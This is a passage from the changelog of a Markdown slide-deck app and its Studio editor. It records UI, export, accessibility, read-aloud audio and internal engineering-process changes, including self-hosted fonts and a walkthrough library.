  paint until it resolves — so a slow or flaky Google Fonts response (mobile, cold
  cache) left the whole app, Studio live preview included, blank for many seconds.
  Those faces are now self-hosted from the woff2 already vendored for the preview
  (`docs/src/styles/fonts.css` → `docs/src/playground/fonts/`), loaded non-blocking
  with `font-display: swap`; the Google preconnect hints are gone. First paint no
  longer waits on a third-party host.
- **The live preview no longer loads KaTeX / Mermaid from a CDN.** The filmstrip
  preview injected the jsdelivr KaTeX stylesheet AND Mermaid runtime into *every*
  deck — even ones with no math or diagrams. Now each is injected only when the deck
  actually has math (`.katex`) or a mermaid fence (`code.language-mermaid`), and the
  Playground + Studio presenter render them from self-hosted copies (KaTeX is staged
  under `katex/` from the `katex` dependency; Mermaid reuses the vendored
  `mermaid-v11.min.js`). A plain deck's preview now pulls **zero** third-party
  resources; a math/diagram deck stays on our own origin. Verified end-to-end (plain
  → nothing, math → self-hosted KaTeX, mermaid → self-hosted Mermaid, no jsdelivr).
- **Read-aloud now pronounces figures correctly** — the Studio narrator was fed the
  raw slide glyphs, so the voice did its own (wrong) expansion, saying `$4.2M` as
  "four dollars and two cents m". It now speaks Cadenza's spoken form (`$4.2M` →
  "four point two million dollars", `18.5%` → "eighteen point five percent", `Q3` →
  "Q three") via a new pure `toSpokenText` helper, while the teleprompter still shows
  the display glyphs. (Same fix already shipped on the `/cadenza` demo.)

- **The OpenRouter cloud voice now actually produces audio.** The read-aloud
  voice ladder (`docs/src/playground/voice-model.js`) called OpenRouter through
  `chat/completions` with a non-existent audio-output model, on the assumption
  that "OpenRouter has no TTS models" — so no audio ever came back and the voice
  silently fell to the estimate/silent floor. It now uses OpenRouter's dedicated
  OpenAI-compatible speech route (`POST /api/v1/audio/speech` → `{ model, input,
  voice, response_format }`, returning a raw mp3 stream), defaults to hosted
  Kokoro (`hexgrad/kokoro-82m`) — the cheapest speech model (~$0.62/M chars) that
  still works on mobile without the on-device 80 MB download — and surfaces the
  API's error text instead of failing silently. `speak()` gained an optional `speed` multiplier (forwarded to the
  route; ignored by models that don't support it) so the pace control changes the
  actual spoken tempo, not just the silent estimate. Same fix also unified
  `voice-model`'s sentence splitter with Cadenza's (lookbehind) so narration no
  longer mis-splits a decimal like `$4.2M`.

- **Read-aloud audio is no longer silently killed by the iPhone's ring/silent
  switch, and failures are now visible.** A bare `AudioContext` plays through iOS's
  "ambient" session, which the hardware mute switch silences — so playback "worked"
  (the highlight tracked) while nothing was audible (a comment claimed the opposite;
  WebKit bug 237322). `unlock()` now promotes the session to `playback` (Safari
  16.4+) so audio uses the media channel that ignores the mute switch. And the voice
  ladder no longer swallows synth/decode errors: `speak()` forwards the real reason
  (HTTP status / CORS / decode) through `onState.error`, exposed via a new
  `audioState()` probe and surfaced on the `/cadenza` page — so a rejected API call,
  a muted channel, and a suspended context are finally distinguishable. Found by an
  adversarial trio (red team + Munger inversion + independent checker).

- **The Playground now remembers where you were and never destroys a draft
  (Specimen Book, PR 5).** Four long-standing state janks fixed at the source
  in a new pure kernel (`docs/src/lib/playground-controller.ts`): the picker's
  search text and lens survive reopening the picker AND a reload; the chosen
  component is remembered across reloads and stays synchronized with the
  picker, which now says "(draft differs)" instead of showing a stale name
  when the draft holds no recognized component; a keystroke in the slide body
  no longer snaps a chosen variant back to default (the variant only re-syncs
  when the `_class` line itself changes); and every draft-replacing path is
  now safe — "Open in Playground" and the landing page hand off through a
  one-shot key that auto-applies only over a pristine draft and otherwise
  parks behind a Replace/Not-now bar, Reset names its target and arm-confirms,
  and both back up the outgoing draft with a one-tap Undo toast. Render
  errors now surface inline on phones (no more `alert()`), and the Insert
  blank skeleton button is gone — the Playground carries no authoring
  scaffold. Covered by 18 kernel unit tests and a six-scenario Playwright
  spec run at desktop and phone widths against the built site.
### Added

- **Vetrina — the self-driving walkthrough library (`docs/src/lib/vetrina/`).**
  The Studio's "Watch demo" is now a general, open-sourceable engine: a
  framework-free fake-cursor "stage" that narrates and drives a host app through
  the host's OWN setters — never synthetic input, so the first real click/keystroke
  is an unambiguous take-over. Three authoring layers over one total primitive
  (`run(ctx)`): a declarative `Step[]` `storyboard()`, a fluent `scene()` recorder
  (`build()` ≡ `storyboard(seed, toData())`, so they're provably isomorphic), and
  the raw `Walkthrough`. A curated five-gesture alphabet (wave / circle / check /
  cross / shake, each a required *meaning*), a `drag` mechanic with a
  success-gated drop (a rejected move snaps back — the theater never shows what
  didn't happen), a cooperative `awaitUser` hand-off, and first-party
  `waitFor` / `loop` / `retry` recipes. **Theming is CSS-first:** a documented
  `--vt-*` token contract a host styles on its own `:root` (light/dark rides the
  host's existing cascade — no engine mode-switch), with a JS `Theme` convenience
  over it; accent colors are validated to a legibility floor and reject
  `url()` / `image()` / control chars. Drive it from React through the thin
  `useWalkthrough` peer-dep adapter (`vetrina/react`); the framework-free core
  stays zero-dependency. The Studio demo is migrated onto it (via that adapter)
  with identical behavior. Proven on the real browser (HARD RULE #23) by an
  exemplar/stress e2e battery — a buildless non-slide `awaitUser` reference tour
  and a generic-host board (gestures, drag success/rejection, CSS-first theming
  across light/dark, accent rejection, root-scoping, interleave + take-over) —
  plus a unit tier and two ownership gates (an import-boundary gate keeping the
  core self-contained, and a `SANCTIONED_GESTURES` gate freezing the alphabet).
  Two fixes fell out of the proof: the stage's `--vt-*` defaults now live in a
  low `@layer` on `:root` instead of inline on the overlay, so a host's own
  `:root` theming actually wins (the documented CSS-first contract); and the
  overlay is no longer `aria-hidden` wholesale, so the Exit button reaches the
  accessibility tree and the narration caption is a polite live region. The
  demo chrome is a single consolidated **narration dock** — one pill carrying the
  live-dot, the narration (falling back to the take-over hint when idle), and Exit
  — replacing the earlier top-strip + bottom-caption pair; its edge is a curated
  `placement: 'top' | 'bottom'`, its corner shape the `--vt-caption-radius` token,
  and its background is translucent so the deck shows through.

### Changed

- **The Specimen Book content migration is complete (PR 4).** The final 23
  components — the whole chart family plus diagram, math, code, and legal —
  now teach themselves: specimen headings on every sample and variant, short
  caption footers, and stress slides at the honest ceiling everywhere one is
  meaningful (journey's five-stage/twelve-task path, roadmap's full grid,
  math's three-step derivation, the six-tier authority chain, code's
  twenty-line wall). Legal decks keep their real statutes; charts keep their
  real data shapes. The `VOICE_DEBT` ledger is empty except inventory's
  recorded capacity mismatch, and the contract graduates: `stressSample` is
  retired and `validate()` now errors on any capacity-bearing manifest
  without its `stressDoc`. **Breaking:** manifests still carrying
  `stressSample` are rejected — spell it `stressDoc { caption, sample }`.

### Changed

- **Group-2 galleries speak the specimen voice (Specimen Book, PR 3).** All 14
  components across comparison, progression, evidence, and imagery now teach
  themselves within their word budgets, with one-line captions and short
  labels on variant/stress footers. New stress slides land for compare-prose,
  compare-table (8 rows), decision, matrix-2x2 (3 per cell), redline,
  split-compare, verdict-grid (5 options), list-criteria (5 gates), list-steps
  (6 steps), kpi, and stats (6 stats); pricing's stress converts to the
  captioned spelling. kpi's stress records a measured truth: the grid seats
  four tiles, so the stress shows four at the word ceiling. Bucket surveys for
  the four buckets carry attribution footers; redline's duplicate see-also
  entry now points at state-chart; British spellings in visible gallery copy
  corrected (HARD RULE #21).

### Changed

- **Group-1 galleries speak the specimen voice (Specimen Book, PR 2).** All 20
  components across anchor, statement, inventory, and connect now teach
  themselves: samples and variant slides describe the layout they demonstrate,
  inside their word budgets, with one-line captions on variant/stress footers.
  New stress slides land for big-number, content, quote, split-panel, actors,
  agenda (7 stops), cards-grid, checklist (9 rows), glossary, inventory, list,
  list-tabular, and q-and-a (6 pairs); agenda and q-and-a stress slides now sit
  in the honest capacity band. Bucket surveys for the four buckets carry
  per-slide attribution footers. The anchor bookends and connect cards drop
  their no-op composition slides. A `<!-- stress-slide -->` marker (generator-
  emitted, specimen-gated) lets deliberate at-the-ceiling slides pass deck lint
  without loosening `capacity-crowd` for authors.

### Added

- **A `model:*` recommendation axis on the work queue.** Every card can now
  carry a recommended Claude model — `model:haiku` (trivial/mechanical),
  `model:fable` (prose/editorial), `model:sonnet` (standard engineering), or
  `model:opus` (complex/novel/high-blast-radius) — so the next picker knows the
  right tier before starting. It's the fifth axis in the **Work item** form
  (optional dropdown, materialized by the Apply-form-labels workflow) and a new
  `model:` set in `.github/labels.json`. **Advisory, not gated:** the intake
  triage gate never flags a card for lacking it. Rubric and tie-breakers:
  `engineering/workflow.md` § Model recommendation. All 59 open cards were
  back-tagged in an adversarial triage pass (red team + Munger inversion +
  independent checker).

- **The gallery content contract (Specimen Book, PR 1).** Component manifests
  gain `stressDoc { caption, sample }` (target spelling for the stress-test
  slide; `stressSample` deprecated) and `specimenVoice` (the migration
  attestation flag). `validate()` now requires a `variantDocs` entry for
  every declared variant — a variant without one was silently dropped from
  the gallery (fixed for `map world`, whose slide now exists in the deck and
  docs). `galleryPlan(m)` is the one exported walk order behind the gallery
  PDFs and page-count contract, and `gallery-contract.test.js` enforces the
  named `VOICE_DEBT`/`VOICE_EXEMPT` ledger (stale entries fail), the
  default-≤-soft capacity gate, the sample-footer ban, and placeholder
  rejection. Prose rules: `design/editorial.md` §Specimen voice.

### Changed

- **`manifest.schema.json` is now the manifest contract's source of truth.**
  The validator (`lib/components/index.js`) and the Studio gate
  (`lib/layout/gate.js`) derive their vocabularies from the schema instead of
  carrying hand-synced copies (one had already drifted — the gate was missing
  the `connect` bucket). The schema gained the three fields real manifests
  already used (`split`, `families`, `dataCompletion`), the previously
  unvalidated `split` carousel recipe is now validated at load (a typo'd
  strategy fails the build instead of silently not splitting), and unknown
  manifest keys are rejected per the schema's `additionalProperties: false`.
  If you load YOUR OWN manifests through this package's `loadAll()`/
  `validate()`: manifests with stray top-level keys or malformed `split`
  blocks that previously loaded will now fail validation — the schema always
  declared them invalid; the loader now agrees.

- **Complexity frontier, pass 3.** The remaining high-complexity functions
  decomposed with the same verified playbook: the forms catalog validators
  (`checkIntegrity`, `validateSlicing`), the deck scorecard (`scoreDeck` →
  five per-category scorers), the Fit Ladder's `carouselize` (→ a
  per-strategy table), and the component-docs generator. 64 functions ≥ 15
  cyclomatic complexity (from 69 pre-refactor); worst engine function 27
  (from 209). The change-coupling tool now excludes generated artifacts
  (committed PDFs / `*.generated.js`) that drowned the signal on full git
  history.

- **Studio settings now live in the non-blocking right column** — per-slide
  settings no longer open a modal drawer that dimmed the deck, so you can judge
  a slide's finish while you tune it. Both deck-wide and per-slide settings
  share the right panel, switched by a deterministic **Slide-first scope rail**,
  with a loud blue (deck-wide) / amber (this-slide override) scope echo so it's
  never ambiguous which you're editing. The editor, preview, and settings stay
  locked to one active slide: the editor centers the active slide on navigation
  and keeps your caret in place across a settings write. On tablet and phone
  the same Slide-first scope switch and echo appear — as an in-panel segment
  (tablet keeps the docked column; phone opens one Sheet) — so the surface is
  identical on every screen. The self-driving guided demo now drives that same
  panel too (it used to pop the old modal drawer), so the walkthrough shows the
  real UI rather than a stand-in; the retired per-slide modal drawer is gone.
- **Engine internals refactored for maintainability** (no rendered-output
  change — verified by the gallery pixel-regression gate). One canonical
  home for the depth-aware HTML list walkers (`lib/core/html-lists.js`)
  and the slide `<section>` walker (`lib/core/section-walk.js`), replacing
  six scattered copies; the shared chart string helpers live in
  `lib/components/chart/_chart-family/transform-utils.js`; the manifest
  validator is now a pipeline of 18 single-concern checkers (worst-case
  cyclomatic complexity 209 → 51 codebase-wide). Fixes the one
  architectural-boundary violation the quality assessment flagged
  (`lib/core` importing a component kernel). See
  `engineering/decisions/2026-07-05-quality-driven-refactor.md`.

### Added

- **HARD RULE #25 — multi-agent orchestration is tiered, budgeted, and
  shaped.** Adversarial verification now scales with blast radius (self-review
  → maker-checker → the mandatory red-team + Munger-inversion +
  independent-checker trio for critical/high-blast-radius/novel work, applied
  only to what ships), every fan-out is cost-estimated up front (>10 agents
  needs an explicit OK), and iteration stays warm inside one agent session.
  Canon in the new `engineering/orchestration.md`; the design-competition
  shape is codified as the parameterized
  `.claude/workflows/design-competition.js`. From the 53-agent retro,
  `engineering/decisions/2026-07-05-orchestration-discipline.md`.

- **Studio settings-panel polish: a collapsible scope rail and one-click Undo.**
  The desktop scope rail now collapses from 72px (icon + caption) to 48px
  (icons only) to reclaim width, and remembers your choice. Every settings
  change in the panel — deck-wide or per-slide — raises a brief bottom-left
  Undo toast (e.g. "Finish → Nimbus · Undo") that reverts it in one click, a
  light complement to ⌘Z / Version history. The now-redundant desktop toolbar
  "Deck inspector" toggle is gone — the rail owns scope there; tablet and
  mobile keep a "Settings" opener (they have no rail), and the first-edit
  discovery nudge moved onto the rail's Deck button.
- **A README in every structural folder.** 29 folder READMEs (lib/ and
  each subdirectory, tools/, test/, spec/, assets/, design/, engineering/,
  examples/, exemplars/) written for a junior engineer: what the folder
  is, who consumes it, the canonical doc it defers to, and the gotcha most
  likely to bite.

- **Automated codebase quality assessment.** `npm run quality` covers seven
  structural-health dimensions in one command: structural coupling,
  architectural boundary violations, circular dependencies, git change
  coupling, complexity, duplication, and dead exports/files —
  `dependency-cruiser` (coupling/boundaries/cycles), `jscpd` (duplication),
  `knip` (dead code), and two new bespoke scripts
  (`tools/change-coupling.js`, `tools/complexity-report.js`), orchestrated
  by `tools/quality-assessment.js`. On-demand, not a blocking CI gate — a
  committed `test/quality/baseline.json` ratchets via `quality:bless`
  /`quality:check`, mirroring the `bench`/`scorecard` pattern. See
  `engineering/quality-assessment.md`.

- **Studio: a self-driving "Watch demo" walkthrough.** A one-click, ~90-second
  live demo (topbar button, the first-run welcome banner, and ⌘K → "Watch demo")
  in which the Studio drives *itself* through the whole first-time arc: open the
  deck menu → **New deck** (a real, persisted **"My First Deck"** the newcomer keeps),
  type a board deck out live into it (the preview tracking each slide as it lands),
  navigate slides, reskin with a theme, flip light/dark, score it board-ready in the
  Architect Coach, Present, and Share — then a closing flourish that polishes the title
  via its own settings drawer (a Nimbus finish + a WIP bracket status, one changed
  `_class` line) and slams into Present full-screen. It's narrated by captions and led
  by a pointer **cue grammar** — a streak-and-ping anticipation before each move, a
  burst on each click, and a circle-and-glow on the "look what rendered" beats. Runs on
  the **real** Studio (real setters + the editor's own transforms, never synthetic
  events), so the first real click or keystroke hands the wheel back ("take over"). The
  walkthrough **leaves a deck behind but never a duplicate**: it always creates
  "My First Deck", deleting any prior one first (a beforeSetup clean-up, like a test
  fixture), so re-running never accumulates copies — the newcomer walks away with the
  built deck. Only the demo's cosmetic global flourishes (theme + light/dark) are
  restored on exit. Reuses the exec-board-update journey, so it needs no AI call and
  spends no key (HARD RULE #24). Respects `prefers-reduced-motion`. Design:
  `engineering/decisions/2026-07-04-studio-demo-walkthrough.md`.

### Deprecated

- **The Drawing Board and the Workbench are frozen — the Studio succeeds
  them.** No further development happens on either surface (security and
  data-integrity fixes still land). The Studio (`/studio/`) already covers
  their jobs and keeps growing; the remaining coaching/conversation depth
  moves over next, then a one-click importer for Drawing Board decks ships
  **before** any deprecation banner or removal — saved themes, components,
  and finishes already live in the shared library and carry over untouched.
  Plan and phased removal:
  `engineering/decisions/2026-07-03-studio-succession.md`.

### Changed

- **Studio: the mobile toolbars stop overflowing — by shrinking, not hiding — and
  the reader-lens control is unified.** Adding Version history had pushed the mobile
  Deck-actions bar past 390px (the Inspector icon clipped). The fix keeps every action
  **inline and one-tap**: the Edit/Preview toggle becomes **icon-only**, which reclaims
  enough width to fit the whole row (no overflow menu — visible beats hidden on a touch
  surface). **Present mode's bottom control bar** now fits phones by construction — the
  counter never wraps, Autoplay collapses to an icon below `sm`, and the non-essential
  voice/caption status is the only thing hidden. The **reader-lens picker** is now one
  shared, always-labeled `LensPicker` used by both the editor preview header and Present
  (was two divergent widgets — a bare icon vs a labeled pill — and three label sources).
  Version history's home is settled by a placement-by-budget rule (desktop editor-header
  icon; phone inline icon). See
  `engineering/decisions/2026-07-04-studio-toolbar-budget.md`.

- **Studio: the Deck inspector is now settings-only — actions and preview modes
  moved out.** Following the same red-team, three things that were not deck
  *settings* left the inspector: the **Read** group (Voice/Pace were
  non-functional stubs) is removed; **Version history** (a recovery affordance —
  it auto-snapshots before every AI edit — not a deck property) moves to its own
  sheet, launched from a **History button in the editor header beside the
  Slide-settings launcher** (always visible, at every breakpoint), with Restore
  always visible for touch; and the **Lenses** reader-view (it filters the *preview*, the source
  stays whole) becomes a "View" dropdown in the preview header. The inspector is
  left with just Look · Running marks · Authoring, and dropdown controls share a
  steadier min-width. Present mode's reader-lens switch becomes the **same
  dropdown** (it was a horizontally-scrolling chip row that clipped on phones).
  See `engineering/decisions/2026-07-04-deck-furniture-declarations.md`.

- **Studio: the deck's running header & footer are text you declare, not
  toggles — and the whole Deck inspector now reads as deck-wide.** The header
  and footer controls in the Deck inspector were on/off switches that stamped
  the deck title; they are now **text fields** where you type the actual copy
  the band renders (blank clears the directive, so presence-of-text *is* the
  switch — the whole point of the feature). The header, footer, page number,
  and section rail are pulled into a dedicated **Running marks** group (a `Frame`
  glyph) named for its *contents* — so the rows stay plainly named (Header ·
  Footer · Page numbers · Section rail) and the earlier lone "Running header"
  naming is resolved. The deck-wide scope is stated **once**, in the drawer
  header ("Applies to the whole deck — each slide inherits it…") with a
  **deck-wide** chip (was "this deck"), parallel to the per-slide drawer's
  `slide N` chip; the group titles and descriptions no longer restate it (a
  red-team found the idea repeated three times). See
  `engineering/decisions/2026-07-04-deck-furniture-declarations.md`.

- **Breaking:** **Retired two dead dials — the `form: minimal` toggle and the
  `loose` density modifier** (both 0 real authored uses; scheduled by the `claim`
  decision §11). `form: minimal` only ever added `no-progress`, which is now the
  explicit `no-progress` chrome control — so it migrates to `class: no-progress`
  (an *exact* behavior-preserving equivalent), not `claim: quiet` (which also drops
  the meta bay + tightens the inset). `loose` (grow the spacing scale) is superseded
  by `claim` owning "give the content the stage." **Kept:** `form: off`,
  `form: standard`, `no-form`, `compact`, and every chrome token. A lingering
  `form: minimal` resolves to `standard` and earns a `retired-form-minimal` lint
  warning; a lingering `loose` becomes `unknown-class`. The `density` exclusive axis
  is removed (`compact` is now a lone toggle; the Studio density Seg becomes a
  compact-only Switch). See
  `engineering/decisions/2026-07-03-retire-form-minimal-loose.md`.

- **Studio: the per-slide "Slide settings" drawer is organized into pill-tabs.**
  The drawer that was one long scroll of ~19 controls now groups them behind
  Workspace-style pill-tabs — **Look** (default: dark, type scale, finish, brand
  bar, density, accent) · **Status** (stamp + tone + shapes) · **Decoration**
  (tint + mark) · **Chrome** (clean-slide + hides) · **Notes** (speaker note).
  Tabs are dynamic: a tab renders only when it has content for the active slide,
  so a hand-authored (non-round-trippable) slide collapses to the Notes tab
  alone. Reset stays pinned at the top and the emitted `_class` line at the
  bottom. The trigger is now a proper icon button (a `FileSliders` glyph — a
  page with setting sliders, i.e. "configure this slide," distinct from the deck
  Inspector's `SlidersHorizontal`; titled "Slide settings") a plain ghost icon
  button matching the editor header's other icon buttons at every breakpoint, and
  the tablist
  is a shared `PillTabs` primitive the Workspace sheet also uses. The deck
  Inspector stays grouped (it is a glanceable reference column — tabbing it would
  be a regression). See
  `engineering/decisions/2026-07-03-slide-settings-pill-tabs.md`.

- **Studio: every setting now explains itself — no magic, no mystery.** Both the
  per-slide "Slide settings" drawer and the deck Inspector gained plain-language
  help text: each tab/group opens with a one-line intro of what it's for, and
  each individual control (dark, type scale, finish, brand bar, stamp, tone,
  tint, mark, chrome toggles; and the deck's theme, mode, brand bar, chrome, …)
  carries a short description that names the concept in plain words and defines
  the jargon on first use — aimed at authors meeting these controls for the
  first time.

- **Studio: the real brand mark and a two-row phone toolbar.** The topbar
  (and focus header) now render the Spectrum Cell mark instead of a text "L"
  tile — inlined so its colors follow the Studio's own light/dark mode, not
  the OS scheme — and the workspace launcher's dropdown chevron shows at every
  width, so the menu no longer reads as a static logo on phones. On phones the
  four deck actions (Present, Share, Architect, Inspector) move to the
  Edit/Preview pane bar — still one tap — and the header's reclaimed width
  goes to the deck title, which now shows whole instead of truncating at a
  fixed 150px. "New deck" lives only in the deck switcher (the launcher keeps
  Decks, Fabricate, and Import), and the desktop bar's right cluster is now
  banded by dividers — utilities | Present · Share | panels | app surfaces —
  so global and deck controls no longer read as one run. See
  `engineering/decisions/2026-07-03-studio-brand-mark-toolbar.md`.

### Fixed

- **Studio: no horizontal overflow at the narrow desktop width.** At 1100–1160px
  with both the Architect and the Inspector open, the 72px scope rail no longer
  forces the split grid past the viewport (nor reopens the #721 zero-void band):
  in that band the rail falls back to icons and, when both panels are open, folds
  into the panel-top scope segment (the tablet pattern) — the column it needs is
  reclaimed. A display adaptation; the stored rail preference is untouched.
- **map demo: the "Naming a region" slide no longer overflows the frame.** A
  trailing clause on the second bullet pushed the slide a hair past the frame
  height (flagged at export, though nothing visibly clipped). Trimmed it — which
  also dropped a stale reference to the frozen Drawing Board — so `examples/map.md`
  exports clean with comfortable breathing room.

- **map: keyed (with-legend) maps no longer shove the basemap off its slot.** The
  world map read as badly misaligned — dead space at the top-left, the southern
  edge clipped, and the continents jammed into the legend. The keyed compositor
  builds a combined `viewBox` starting at `0 0` and placed the region paths in a
  `<g>` translated only by the legend's diagram offset — but the baked paths carry
  their native projected origin (`67, 37` for the world map), so every region
  landed that far off inside its box (~7% for the world; the US origin `−64, 8`
  falls in empty ocean, which is why only the world map looked broken). The group
  transform now subtracts the basemap's native viewBox origin, so the map fills
  its slot exactly with an even gap to the key, in every variant (choropleth /
  highlight / grouped) and both projections (Equal Earth / Robinson). The keyless
  path was already correct. Map and legend remain vertically co-centered.

- **Studio: the Deck settings panel collapses from its own header, not only the
  top bar.** The collapsed rail expands the panel with a `‹` chevron, but the
  expanded panel had no matching control — you had to reach up to the top-bar
  toggle to close it. The expanded header now carries a mirror `›` collapse
  chevron, so the same affordance toggles both ways.

- **Studio: no more stray horizontal scrollbar at tablet width.** The Studio's
  collapsed split-rail (the thin restore strip for a hidden editor/preview pane)
  is always rendered — kept as a grid item so the grid's track count stays stable
  — and hidden via `visibility` when its track is `0px`. But a grid item doesn't
  shrink to a `0px` fixed track on its own, and with `box-sizing:border-box` its
  padding + border floored the box at ~13px, which poked past the viewport (a
  ~13px sideways scroll around the 820px tablet width). The rail now gates its
  width, padding, AND border behind `data-visible`, so a hidden rail is a true
  `0px` box; the collapsed-pane rail (width, padding, boundary line) is unchanged.

- **SVG charts share one sizing model — container-fill.** The SVG chart-family
  charts (piechart, radar, map, cohort + default quadrant) bound `height:100cqh;
  width:auto` to size their figure. The Form (default) rendering path for all five
  — plus the non-form path for pie/radar/map/cohort — now uses the standard
  responsive `width:100%; height:100%` against their definite `container-type:size`
  parent, letting `preserveAspectRatio="xMidYMid meet"` shrink-to-fit. (The
  non-form default quadrant keeps its slide-relative #180 rule; hero/bleed keep
  their own.) Same pixels (a square chart's horizontal margin is aspect-ratio, not
  a sizing bug), print-safe (verified in PDF export), one fewer axis-binding scheme.
  See `engineering/decisions/2026-07-04-chart-container-fill-sizing.md`.

- **PPTX export now carries speaker notes.** The owned image-per-slide `.pptx`
  writer dropped every note — a note authored in Markdown survived to the PDF and
  the HTML sidecar but silently vanished from PowerPoint. `writePptx` now writes
  each slide's note into its notes placeholder via `slide.addNotes()`, index-aligned
  to the slides and drawing on the same `notes-core` boundary the PDF path uses
  (HARD RULE #1) — so the tooling-pragma exclusion and multi-comment joining match
  across formats, and a slide with no note carries no presenter copy. Verified
  end-to-end: a three-slide deck exports with the note on slide 1, none on a
  pragma-only slide 2, and both joined notes on slide 3.

- **`claim-hero` no longer collides the page number with vertically-filling content.**
  Hero keeps the page number but had collapsed the footer reserve to the bare edge inset,
  so a grid that fills the height (matrix-2x2, verdict-grid, statute-stack) ran its
  bottom-right cell under the number. Hero now reserves a thin page-number strip — but
  only when the number is actually shown (`:has(.lat-pagination)` and not
  `no-paginate`/`silent`), so a `claim-hero no-paginate` slide still fills fully to the
  edge.

- **Diagram slide titles now left-align to the margin like every other component.** The
  `diagram` layout centers its children so the Mermaid SVG sits centered, which also
  shrink-centered the masthead band — floating the title/eyebrow toward the middle. The
  band now stretches full-width (`align-self: stretch`, the same override the Key Insight
  blockquote already uses), so the title left-aligns while the SVG stays centered.

- **Chart and diagram subtitles now align to the title and hug the title band.** Under the
  Form, a chart/diagram lifts its eyebrow + title into the left-aligned masthead band, but
  the in-flow subtitle (dek) was left behind: it rendered *centered* and inset (charts kept
  the full centered `.chart-header`; the diagram `<p>` got shrink-centered by
  `align-items: center`, the same trap the title hit), and it floated a full title-band
  clearance below the rule. Now the subtitle pins to the title's exact left edge
  (`text-align: left` + zeroed inset for charts; `align-self: stretch` for the diagram
  `<p>`), and the title→subtitle gap is tightened *only when a subtitle leads* — a
  title-only slide keeps its full clearance below the band. The chart family's decorative
  `::after` accent hairline is retired under the Form, where the masthead's own rule is
  already the header↔body divider (it was a redundant second line, and a stray rule on a
  subtitle-less header). See `engineering/decisions/2026-07-04-form-subtitle-alignment.md`.

- **Status markers now read on dark title/closing/divider slides.** These bookends paint
  a dark surface but deliberately keep `color-scheme: light` (so their explicit headings
  hold), which left an accent-colored marker (`pinned`/`revised`) resolving its
  `light-dark()` color to the faint light value on the dark field — a barely-visible ring.
  The marker `::before` now flips its own `color-scheme` to dark, so the label picks the
  bright on-dark side (mirroring the inline-code chip rebind).

### Added

- **Accessible PDF: title + language.** An exported PDF now carries the deck's **title** and
  **language** (from the `title:` / `lang:` front-matter, else the first heading / English),
  so a screen reader announces both and the file shows a real name in the viewer — previously
  it had neither (WCAG 2.4.2 Page Titled, 3.1.1 Language of Page). The Studio's vector **Print**
  and live preview frames also declare the language. Full per-image alt text *inside* the PDF
  still needs a tagged-PDF pipeline — a tracked follow-on; PPTX and HTML already carry the
  per-slide descriptions. See `engineering/decisions/2026-07-03-semantic-html-accessibility.md`.

- **The `.lattice` project file — your comments travel with the deck.** Share → **Lattice
  project (.lattice)** saves a single file holding the deck plus its review **comments**;
  open it back (import a `.lattice`) and the deck returns with every comment intact. Comments
  live in the app, not the Markdown, so this is how they move between machines or to a
  collaborator — separately from a plain `.md`. The source round-trips losslessly for any
  well-formed text. The self-contained shareable player and full theme/asset packaging are the
  next steps for this format. See `engineering/decisions/2026-06-16-lattice-export-format.md`.

- **Export options + comments in your PDF.** Share → PDF now opens a short **Export options**
  step before the download. Your review **comments** are off by default (a clean handout never
  leaks private notes) — flip them on and each comment rides the PDF as a real **sticky-note
  annotation** on its slide, the kind you click to read in any PDF viewer (Acrobat, Preview,
  Chrome). Choose **All** comments or **Open only**. Works on both PDF export lanes (the fast
  off-thread one and the fallback), so the notes look the same however the file was built.
  See `engineering/decisions/2026-07-04-comments-layer.md`.

- **Accessible slide descriptions — the text alternative (WCAG SC 1.1.1).** A per-slide
  `<!-- describe: … -->` channel: an objective equivalent of what the slide shows, for a
  screen-reader user. It is a **separate channel from the speaker note** (consumed by the
  engine, never spoken) and exports as the **PPTX image alt text** (both the CLI and the
  Studio's own PowerPoint export — closing the image-per-slide gap where a screen reader
  got only "Slide N, Picture"; the alt is read from the rendered slide it sits on, so it
  stays with the right slide on front-matter and auto-split decks) and an **aria description
  in HTML**. Author it in the Studio's
  Notes tab beside the speaker note; an AI **Generate** drafts a slide-local, structure-first
  alternative you **review and confirm** (unconfirmed AI text never exports). When no cloud
  model is connected, the field offers a one-tap **Connect AI** (OpenRouter) inline — the same
  affordance as Fabricate — instead of a dead-end message. PDF `/Alt` needs a tagged-PDF
  pipeline and is a follow-on. See `engineering/decisions/2026-07-04-accessible-descriptions.md`.

- **Comments — a per-slide review layer in the Studio.** Leave review feedback on a slide
  (“double-check this figure”) — a distinct channel from the speaker note and the
  description. Add (⌘↵), resolve/reopen, delete, per-slide, in the drawer's **Comments** tab.
  Comments are app state (per-deck), **not** the deck markdown, and never appear on a slide
  or in an export. The `.lattice`-file travel and the opt-in PDF sticky-note export are
  documented follow-ons. See `engineering/decisions/2026-07-04-comments-layer.md`.

- **`spectrum:` register — white-label the brand bar.** A deck front-matter register
  controls the **spectrum** (the rainbow gradient bar every slide carries on its top
  border, and a `divider` carries as a left rail): `spectrum: off` removes it for a clean
  edge, `spectrum: solid` repaints it in the theme's single `--accent` (set the accent to
  a client's brand color and the whole bar follows), `on` is the rainbow default. The
  register targets the three brand-bar sites (top border, dark-canvas line, divider rail)
  without touching the shared `--spectrum` token, so an author's `---` rules and other
  spectrum-derived decorations survive `spectrum: off`; overridable per slide with a
  `spectrum-<value>` token, validated by a new `unknown-spectrum` lint. Vocab:
  `lib/core/resolve-spectrum.js`; design:
  `engineering/decisions/2026-07-03-spectrum-register-white-label.md`.

- **The chrome-control matrix is complete — every band toggles at both slide and
  deck scope.** Authors can now show or hide the running header, footer, page
  number, and section rail at *both* scopes. New this release: a deck-wide
  **Footer** control (the native `footer:` directive, mirroring `header:`), a
  deck-wide **Section rail** control (propagates `class: no-progress`), and a
  per-slide **Hide rail** toggle (`no-progress`) in the Studio's *This slide*
  Chrome section. Header (`header:` / `no-header`), page number (`paginate:` /
  `no-paginate`), and `silent` were already present; this fills the two missing
  cells (deck-wide footer, rail at either scope). Full matrix:
  `docs/src/content/docs/guides/authoring.md` (Chrome) and
  `design/design-system.md` §6.5.

- **The Studio's Notes button is now a "This slide" drawer** — a context-sensitive
  editor for one slide's craft, beyond the speaker note. Toggle **dark** (tri-state:
  it reads "inherited" when the deck is dark, never a broken off), pick a **type
  scale** (M/L/XL/2XL), set a per-slide **finish** (inherit / none / any preset or
  saved finish), tune **density** (compact / default / loose + accent), stamp a
  **state** (wip … revised) or **tone** (pass/warn/fail/skip), apply a **decoration**
  (tint + mark), and control **chrome** (clean-slide, or granular header/footer/page).
  Every control is driven by the engine's generated vocabulary (so it never drifts),
  writes span-surgically into the slide's `_class` — preserving hand-authored tokens —
  and shows the emitted `<!-- _class: … -->` line with inherited deck tokens ghosted,
  so authors learn the markdown. The drawer only offers what the active layout accepts,
  and goes read-only on a class shape it can't round-trip.
